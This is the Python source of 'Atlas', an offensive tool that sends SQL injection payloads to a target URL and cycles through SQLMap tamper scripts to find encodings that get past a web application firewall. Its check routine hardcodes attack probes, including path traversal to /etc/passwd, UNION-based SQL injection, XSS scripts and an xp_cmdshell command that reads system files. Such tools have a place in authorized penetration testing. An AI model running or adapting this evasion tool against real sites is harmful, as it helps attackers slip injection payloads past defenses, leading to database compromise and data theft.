#!/usr/bin/env python
# -*- coding:utf-8 -*-
# -----------------------------------------
# Atlas - Quick SQLMap Tamper Suggester
# by Momo "M4ll0k" Outaadi 
# -----------------------------------------

import re
import sys
import getopt
from lib.ragent import *
from lib.params import *
from lib.request import *
from lib.printer import *
from urlparse import urlsplit

class Process(Request):
	# -- processor -- #
	def __init__(self,url,method,data,kwargs):
		self.url = url 
		self.data = data
		self.kwargs = kwargs
		self.method = method.lower()
		self.verbose = kwargs['verbose']
		Request.__init__(self,kwargs)

	def run(self):
		payload = self.kwargs['payload']
		payload = payload.replace(' ','%20')
		if self.method == 'get':
			testable = Params(self.url,payload,self.data)
			for url in testable.run():
				resp = self.send(url)
				if self.kwargs['verbose']:
					info2('URL: %s'%resp.url)
				if self.kwargs['var'] == 0:
					return resp.code
				elif self.kwargs['var'] == 1:
					if resp.code in range(400,599):
						warn('return HTTP error code: \"%s\"'%resp.code)
					elif resp.code in range(200,299):
						plus('return HTTP code \"%s\", a potential tamper is found: \"%s\"'%(resp.code,
							self.kwargs['tamper'])
						)
		elif self.method == 'post':
			url = self.url
			data = self.data
			testable = Params(self.url,payload,self.data)
			for param in testable.run():
				try:
					if Parse(self.url).host in param:
						url = param
						data = self.data
					else:
						url = self.url
						data = param
				except AttributeError as e:
					url = self.url
					data = param
				# -- Oops! --
				resp = self.send(url=url,method='POST',data=param)
				if self.kwargs['verbose']:info2('URL: %s'%resp.url)
				# -- --
				if self.kwargs['var'] == 0:return resp.code 
				elif self.kwargs['var'] == 1:
					if resp.code in range(400,599):
						warn('return HTTP error code: \"%s\"'%resp.code)
					elif resp.code in range(200,299):
						plus('return HTTP code \"%s\", a potential tamper is found: \"%s\"'%(resp.code,
							self.kwargs['tamper'])
						)
	
	def check(self):
		# -- a potential blocked payload by waf
		payload  = ['../etc/passwd']
		payload += ['" AND 1=2, OR 1=2']
		payload += ['<scrit>alert(1)</script>']
		payload += ['7116 AND 1=1 UNION ALL SELECT 1,NULL,']
		payload[3] += "<script>alert(\"XSS\")</script>,table_name"
		payload[3] += " FROM information_schema.tables WHERE 2>1--/**/;"
		payload[3] += "EXEC xp_cmdshell('cat ../../../etc/passwd')"
		# -- init -- #
		for p in payload:
			p = p.replace(' ','%20')
			if self.method == 'get':
				testable = Params(self.url,p,self.data)
				for url in testable.run():
					resp = self.send(url)
					waf = waf_identify(resp.headers,resp.content,resp.code)
					if(waf):return
			elif self.method == 'post':
				testable = Params(self.url,p,self.data)
				for params in testable.run():
					try:
						if Parse(params).host in params:url=params;data=self.data
						else:url = self.url;data=params
					except AttributeError as e:
						url = self.url
						data = params
					resp = self.send(url,self.method,data=data)
					waf = waf_identify(resp.headers,resp.content,resp.code)
					if(waf):return
		return

class Parse(object):
	def __init__(self,url):
		if 'http' in url or 'https' in url:
			self.host = urlsplit(url).netloc
			self.path = urlsplit(url).path

class atlas(object):
	def usage(self,_=False):
		def p_usage():
			usage  = "Usage: {name} [OPTIONS]\n\n".format(name=sys.argv[0])
			usage += "\t-u --url\t\tTarget URL (e.g: http://test.com/index.php?id=1)\n"
			usage += "\t-p --payload\t\tSet Payload (SQLMap payload return 4xx-5xx code)\n"
			usage += "\t-d --dbms\t\tSet DBMS: mysql,mssql,..etc (more quick!)\n"
			usage += "\t-m --method\t\tSet method: POST or GET\n"
			usage += "\t-D --data\t\tSet post data (e.g: --data=\"id=1..\")\n"
			usage += "\t-a --agent\t\tSet HTTP User agent (e.g: --agent=\"string..\")\n"
			usage += "\t-c --cookie\t\tSet HTTP Cookie (e.g: --cookie=\"string..\")\n"
			usage += "\t-r --random-agent\tSet a random HTTP User agent\n"
			usage += "\t-A --allow-redirect\tAllow target URL redirect\n"
			usage += "\t-t --timeout\t\tSet timeout (e.g: --timeout=\"5\")\n"
			usage += "\t-v --verbose\t\tShow more information\n"
			usage += "\t-h --help\t\tShow this help and exit\n"
			return usage
		self.banner()
		print(p_usage())
		if(_):sys.exit(0)
	
	def banner(self,__=False,_=False):
		print r"       _   _                      "
		print r"      | | | |                     " 
		print r"  __ _| |_| | __ _ ___            "
		print r" / _` | __| |/ _` / __|           "
		print r"| (_| | |_| | (_| \__ \ v.0.1     " 
		print r" \__,_|\__|_|\__,_|___/ by M4ll0k "
		print r"                                  "
		print r" Quick SQLMap Tamper Suggester    "
		print r"-----------------------------------"
		if(_):sys.exit(0)
		if(__):print('')
	
	def main(self):
		kwargs = {
					'url'            : None, 
					'payload'        : None, 
					'dbms'           : 'general', 
					'method'         : 'GET', 
					'data'           : None, 
					'agent'          : ragent(),
					'cookie'         : None, 
					'random-agent'   : False,
					'allow-redirect' : False, 
					'timeout'        : None, 
					'verbose'        : False,
					'proxy'          : None,
					'var'            : 0,
					'tamper'         : None,
				}
		# -- cmd args -- #
		s_cmd  = "u:p:d:m:D:a:c:t:Avrh"
		l_cmd  = [
		          "url=","payload=","dbms=",",method=","data=","agent=","cookie=",
		          "random-agent","allow-redirect","timeout=","verbose=","help="
		        ]
		try:
			opts,args = getopt.getopt(sys.argv[1:],s_cmd,l_cmd)
		except getopt.GetoptError as e:
			self.usage(True)
		for i in range(len(opts)):
			if(opts[i][0] in('-h','--help')):self.usage(1)
			if(opts[i][0] in('-u','--url')):kwargs['url']=opts[i][1]
			if(opts[i][0] in('-p','--payload')):kwargs['payload']=opts[i][1]
			if(opts[i][0] in('-d','--dbms')):kwargs['dbms']=opts[i][1]
			if(opts[i][0] in('-m','--method')):kwargs['method']=opts[i][1]
			if(opts[i][0] in('-D','--data')):kwargs['data']=opts[i][1]
			if(opts[i][0] in('-a','--agent')):kwargs['agent']=opts[i][1]
			if(opts[i][0] in('-c','--cookie')):kwargs['cookie']=opts[i][1]
			if(opts[i][0] in('-t','--timeout')):kwargs['timeout']=opts[i][1]
			if(opts[i][0] in('-v','--verbose')):kwargs['verbose']=True
			if(opts[i][0] in('-r','--random-agent')):kwargs['agent']=ragent()
			if(opts[i][0] in('-A','--allow-redirect')):kwargs['allow-redirect']=True
		if(len(sys.argv)<2) or not kwargs['url']:self.usage(1)
		if(kwargs['payload'] is None):warn2('Please set payload with "-p|--payload" options',1)
		if(kwargs['data'] != None):kwargs['method']='POST'
		self.banner(__=1)
		print("[*] Starting at %s\n"%(strftime))
 		# -- vars -- #
		url = kwargs['url']
		data = kwargs['data']
		dbms = kwargs['dbms']
		_payload = kwargs['payload']
		method = kwargs['method'] if data is None else 'post'
		# -- init -- #
		plus2('testing connection to the target URL...')
		info2('checking if the payload is blocked by some kind of WAF/IDS/IPS..')
		kwargs['var'] = 0
		code = Process(
			url,method,data,kwargs
			).run() # run()
		if code in range(400,599):
			warn2('return HTTP error code \033[1;31m\"%s\"\033[0;33m, the target is protected by some kind of WAF/IDS/IPS..'%code)
			plus2('using WAF scripts to detect backend WAF/IPS/IDS protection')
			Process(
				url,method,data,kwargs
				).check()
		else:plus('return HTTP code \"%s\", the payload not blocked by some kind of WAF/IDS/IPS..'%code,1)
		plus2('trying with sqlmap tampers...')
		kwargs['var'] = 1
		if dbms:
			info2('loading \"%s\" tampers...'%dbms)
			tampers = tamper_importer(dbms)
			if not tampers:
				warn2('%s tampers not found.. loading general tampers..'%dbms.upper())
				tampers = tamper_importer('general')
		for tamper in tampers:
			kwargs['tamper'] = tamper.__name__.split('_')[1]
			info2("trying with \"%s\" tamper..."%tamper.__name__.split('_')[1])
			payload__ = tamper(_payload)
			if payload__ != kwargs['payload']:
				kwargs['payload'] = payload__
				if kwargs['verbose']:
					payload(kwargs['payload'])
				Process(url,method,data,kwargs).run()
		# -- end init -- #

def waf_identify(headers,content,code):
	# -- waf identify -- #
	path = os.path.join(os.path.abspath('.'),'waf')
	for file in listdir(path):
		file = file.split('.py')[0]
		__import__("waf.%s"%file)
		waf = sys.modules['waf.%s'%file]
		waf = waf.__dict__[file]
		wf = waf(headers,content,code)
		if(wf):
			info2('WAF/IPS/IDS identified as: \033[1;38m%s\033[0m'%wf)
			return True
	info('WAF/IPS/IDS not identified!!')

def listdir(path):
	py_files = []
	for file in os.listdir(path):
		if file.endswith('.py')and not file == '__init__.py':
			py_files.append(file)
	return py_files

def tamper_importer(dbms):
	# -- tamper -- #
	tampers = []
	path = os.path.join(os.path.abspath('.'),'tamper')
	for file in listdir(path):
		file = file.split('.py')[0]
		__import__("tamper.%s"%file)
		tamper = sys.modules['tamper.%s'%file]
		tamper = tamper.__dict__[file]
		if tamper not in tampers:
			if dbms in tamper.__name__:
				tampers.append(tamper)
	return tampers

try:
	atlas().main()
except KeyboardInterrupt as e:
	warn('User quit!!',1)
